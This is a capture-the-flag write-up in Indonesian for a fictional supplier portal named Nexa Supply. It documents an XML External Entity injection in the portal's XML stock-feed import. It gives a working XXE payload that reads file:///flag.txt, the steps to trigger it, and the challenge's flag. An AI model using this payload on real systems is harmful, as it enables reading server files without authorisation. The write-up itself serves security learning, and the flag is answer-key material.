
# 1. Nexa Supply — XXE

**Kategori:** Web Security  
**Vulnerability:** XML External Entity Injection (XXE)

## Deskripsi

NexaSupply adalah portal supplier untuk jaringan NexaCommerce. Supplier dapat masuk, meninjau katalog, serta mengimpor pembaruan stok atau harga dari feed XML hasil ekspor ERP.

## Analisis

Platform menerima upload file atau input teks berformat XML. Server tidak melakukan validasi terhadap entity XML, sehingga attacker dapat mendefinisikan external entity dan membaca file di server.

## Payload

```xml
<?xml version="1.0"?>
<!DOCTYPE products [
  <!ENTITY xxe SYSTEM "file:///flag.txt">
]>
<products>
  <product>
    <sku>NS-EL-9001</sku>
    <name>Nexa Travel Dock</name>
    <category>Accessories</category>
    <description>&xxe;</description>
    <price>64.00</price>
    <stock>40</stock>
  </product>
</products>
```

## Eksploitasi
- Buka halaman Import feed.
- Masukkan payload XML di atas.
- Klik Validate and Import.
- Flag muncul pada kolom DESCRIPTION di import preview.

## Flag
> NFX{xxe_supply_f33d_lb0d_4f13_9d4c}
